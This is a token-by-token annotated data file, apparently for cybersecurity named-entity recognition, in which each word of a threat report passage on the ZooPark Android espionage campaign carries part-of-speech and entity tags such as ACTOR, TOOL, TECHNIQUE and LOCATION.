ZooPark	NNP	ACTOR
is	VBZ	O
a	DT	O
cyberespionage	NN	EFFECT
operation	NN	O
that	WDT	O
has	VBZ	O
been	VBN	O
focusing	VBG	O
on	IN	O
Middle	NNP	LOCATION
Eastern	NNP	LOCATION
targets	NNS	O
since	IN	O
at	IN	O
least	JJS	O
June	NNP	O
2015	CD	O
.	.	O
The	DT	O
threat	NN	O
actors	NNS	O
behind	IN	O
the	DT	O
operation	NN	O
infect	NN	O
Android	NNP	OS
devices	NNS	O
using	VBG	O
several	JJ	O
generations	NNS	O
of	IN	O
malware	NN	O
,	,	O
with	IN	O
the	DT	O
attackers	NNS	O
including	VBG	O
new	JJ	O
features	NNS	O
in	IN	O
each	DT	O
iteration	NN	O
.	.	O
We	PRP	O
label	VBP	O
them	PRP	O
from	IN	O
v1-v4	NN	O
,	,	O
with	IN	O
v4	NN	O
being	VBG	O
the	DT	O
most	RBS	O
recent	JJ	O
version	NN	O
deployed	VBN	O
in	IN	O
2017	CD	O
.	.	O
From	IN	O
the	DT	O
technical	JJ	O
point	NN	O
of	IN	O
view	NN	O
,	,	O
the	DT	O
evolution	NN	O
of	IN	O
ZooPark	NNP	ACTOR
has	VBZ	O
shown	VBN	O
notable	JJ	O
progress	NN	O
:	:	O
from	IN	O
the	DT	O
very	RB	O
basic	JJ	O
first	JJ	O
and	CC	O
second	JJ	O
versions	NNS	O
,	,	O
the	DT	O
commercial	JJ	TOOL
spyware	NN	TOOL
fork	NN	TOOL
in	IN	O
its	PRP$	O
third	JJ	O
version	NN	O
and	CC	O
then	RB	O
to	TO	O
the	DT	O
complex	JJ	O
spyware	NN	TOOL
that	WDT	O
is	VBZ	O
version	NN	O
4	CD	O
.	.	O
This	DT	O
last	JJ	O
step	NN	O
is	VBZ	O
especially	RB	O
interesting	JJ	O
,	,	O
showing	VBG	O
a	DT	O
big	JJ	O
leap	NN	O
from	IN	O
straightforward	JJ	O
code	NN	O
functionality	NN	O
to	TO	O
highly	RB	O
sophisticated	JJ	O
malware	NN	O
.	.	O
We	PRP	O
have	VBP	O
observed	VBN	O
two	CD	O
main	JJ	O
distribution	NN	O
vectors	NNS	O
for	IN	O
ZooPark	NNP	ACTOR
-	:	O
Telegram	NNP	O
channels	NNS	O
and	CC	O
watering	VBG	TECHNIQUE
holes	NNS	TECHNIQUE
.	.	O
The	DT	O
second	JJ	O
one	NN	O
was	VBD	O
the	DT	O
preferred	JJ	O
vector	NN	O
:	:	O
we	PRP	O
found	VBD	O
several	JJ	O
news	NN	O
websites	NNS	O
that	WDT	O
have	VBP	O
been	VBN	O
hacked	VBN	O
by	IN	O
the	DT	O
attackers	NNS	O
to	TO	O
redirect	VB	O
visitors	NNS	O
to	TO	O
a	DT	O
downloading	VBG	O
site	NN	O
that	WDT	O
serves	VBZ	O
malicious	JJ	O
APKs	NNP	O
.	.	O
Some	DT	O
of	IN	O
the	DT	O
themes	NNS	O
observed	VBN	O
in	IN	O
campaign	NN	O
include	VBP	O
"	JJ	O
Kurdistan	NNP	O
referendum	NN	O
"	NNP	O
,	,	O
"	NNP	O
TelegramGroups	NNP	O
"	NNP	O
and	CC	O
"	NNP	O
Alnaharegypt	NNP	O
news	NN	O
"	NNP	O
,	,	O
among	IN	O
others	NNS	O
.	.	O
Target	NN	O
profile	NN	O
has	VBZ	O
evolved	VBN	O
during	IN	O
the	DT	O
last	JJ	O
years	NNS	O
of	IN	O
campaign	NN	O
,	,	O
focusing	VBG	O
on	IN	O
victims	NNS	O
in	IN	O
Egypt	NNP	LOCATION
,	,	O
Jordan	NNP	LOCATION
,	,	O
Morocco	NNP	LOCATION
,	,	O
Lebanon	NNP	LOCATION
